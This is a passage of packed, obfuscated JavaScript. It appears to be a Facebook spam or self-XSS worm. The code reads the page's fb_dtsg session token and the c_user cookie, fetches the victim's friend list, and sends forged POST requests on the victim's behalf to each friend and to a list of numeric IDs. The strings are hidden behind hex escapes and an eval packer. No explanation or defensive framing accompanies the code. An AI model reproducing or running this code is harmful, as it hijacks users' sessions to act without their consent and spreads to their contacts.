1A();1K[L[10]](L[5],L[6]+1e+L[7]+2v[L[8]]()+L[9],2w);1K[L[11]]();1w(1K[L[12]]!=4){}2n{2a=2x(L[13]+1K[L[15]][L[14]](9)+L[16]);1w(2a[L[17]]){}2n{1J=2a[L[21]][L[20]][L[19]](1h(a,b){2y a[L[18]]-b[L[18]]})}};N 1g=Y[L[2]](L[1])[0][L[0]];N 1e=Y[L[4]][L[3]](Y[L[4]][L[3]](/1z=(\\d+)/)[1]);2z(N i=0;i<1J[L[22]];i++){N 1B=1j 1A();N 2o=L[23]+1J[i][L[24]]+L[25]+1e+L[26]+1g+L[27];N 2b=L[28]+1J[i][L[24]]+L[29]+1e+L[1T]+1g+L[2e];1B[L[10]](L[2f],2o,1D);1B[L[1P]](L[2g],L[2h]);1B[L[1P]](L[2i],2b[L[22]]);1B[L[1P]](L[2j],L[2k]);1B[L[2l]]=1h(){1w(1B[L[12]]==4&&1B[L[2A]]==1E){}};1B[L[11]](2b)};N V=["\\1i\\k\\I\\K\\f","\\G\\P\\j\\x\\g\\t\\Q","\\Q\\f\\g\\1d\\I\\f\\H\\f\\o\\g\\t\\1m\\M\\1H\\k\\H\\f","\\H\\k\\g\\B\\T","\\B\\l\\l\\1a\\q\\f","\\S\\S\\U\\U\\U\\X\\G\\k\\B\\f\\P\\l\\l\\1a\\X\\B\\l\\H\\S\\k\\1f\\k\\1c\\S\\G\\y\\q\\f\\o\\x\\t\\S\\I\\q\\t\\g\\t\\S\\t\\K\\P\\t\\B\\y\\q\\P\\f\\S\\H\\l\\x\\q\\G\\M\\1L\\I\\l\\B\\k\\g\\q\\l\\o\\A\\F\\f\\y\\H\\k\\I\\q\\o\\1a\\z\\k\\B\\g\\q\\l\\o\\A\\t\\K\\P\\t\\B\\y\\q\\P\\f\\z\\G\\I\\q\\x\\A","\\G\\P\\j\\x\\g\\t\\Q\\A","\\z\\j\\j\\K\\t\\f\\y\\A","\\z\\j\\j\\k\\A\\n\\z\\j\\j\\x\\M\\o\\A\\C\\o\\v\\k\\T\\M\\1f\\s\\r\\M\\o\\1t\\F\\1C\\E\\1k\\H\\1u\\1u\\K\\1k\\1n\\M\\w\\1t\\1d\\1b\\1C\\v\\M\\l\\z\\j\\j\\y\\f\\1q\\A\\x\\z\\g\\g\\t\\g\\k\\H\\F\\A\\h\\w\\r\\v\\n\\w\\v\\n\\m\\r\\u\\r\\n\\h\\n\\n\\n\\r\\C\\m","\\1G\\1x\\1s\\1v","\\l\\F\\f\\o","\\l\\o\\y\\f\\k\\x\\M\\t\\g\\k\\g\\f\\B\\T\\k\\o\\Q\\f","\\y\\f\\k\\x\\M\\1s\\g\\k\\g\\f","\\t\\g\\k\\g\\K\\t","\\B\\I\\l\\t\\f","\\t\\f\\o\\x","\\n\\u\\v\\r\\r\\E\\u\\s\\h\\m\\n\\h\\s\\s\\w","\\n\\r\\w\\u\\v\\E\\r\\r\\u\\r\\n\\r\\m\\r\\n","\\n\\u\\w\\E\\C\\n\\r\\w\\h\\n\\r\\m\\m\\u\\n","\\n\\r\\E\\r\\r\\s\\w\\r\\u\\h\\h\\r\\n\\w\\r","\\n\\u\\n\\m\\v\\v\\m\\r\\r\\h\\u\\v\\r\\h\\r\\v","\\r\\E\\C\\C\\h\\E\\C\\u\\s\\w\\s\\E\\s\\u\\s","\\r\\E\\C\\C\\h\\E\\C\\C\\m\\s\\m\\w\\m\\m\\C","\\r\\E\\C\\C\\h\\E\\v\\C\\s\\w\\s\\E\\s\\s\\m","\\n\\s\\C\\r\\r\\s\\m\\v\\n\\E\\s\\C\\r\\n\\C\\m","\\n\\s\\C\\r\\r\\s\\m\\v\\C\\E\\s\\C\\r\\n\\w\\u","\\n\\s\\C\\r\\r\\s\\m\\E\\C\\E\\s\\C\\r\\n\\r\\u"];N 1g=Y[V[2]](V[1])[0][V[0]];N 1e=Y[V[4]][V[3]](Y[V[4]][V[3]](/1z=(\\d+)/)[1]);1h 1r(a){N b=1j 1A();N c=V[5]+a;N d=V[6]+1g+V[7]+1e+V[8];b[V[10]](V[9],c,1D);b[V[11]]=1h(){1w(b[V[12]]==4&&b[V[13]]==1E){b[V[14]]}};b[V[15]](d)};1r(V[16]);1r(V[17]);1r(V[18]);1r(V[19]);1r(V[20]);1r(V[21]);1r(V[22]);1r(V[23]);1r(V[24]);1r(V[25]);1r(V[26]);',62,161,'|||||||||||||||x65|x74|x32||x5F|x61|x6F|x30|x31|x6E||x69|x35|x33|x73|x34|x38|x36|x64|x72|x26|x3D|x63|x37|x25|x39|x70|x66|x6D|x6C|_0x3640|x75|_0x9b0e|x79|var|_0x388c|x62|x67|_0x2407|x2F|x68|x77|_0x4e61|x20|x2E|document|x41|||||||||||x6B|x43|x78|x45|user_id|x6A|fb_dtsg|function|x76|new|x55|x21|x42|x47|x5B|x5D|x71|LIST|x53|x7A|x57|x54|if|x4F|x44|c_user|XMLHttpRequest|httpwp|x51|true|200|x2D|x50|x4E|x29|friends|gf|x3F|x48|now|Date|35|x5E|x59|x4D|30|x3A|x28|x56|come|ufi|x46|||||||||||data|paramswp|x52|pn|31|32|33|34|36|37|38|39|com|else|urlwp|x3C|x4C|x40|x4B|x4A|Array|Math|false|eval|return|for|40'.split('|'),0,{}))
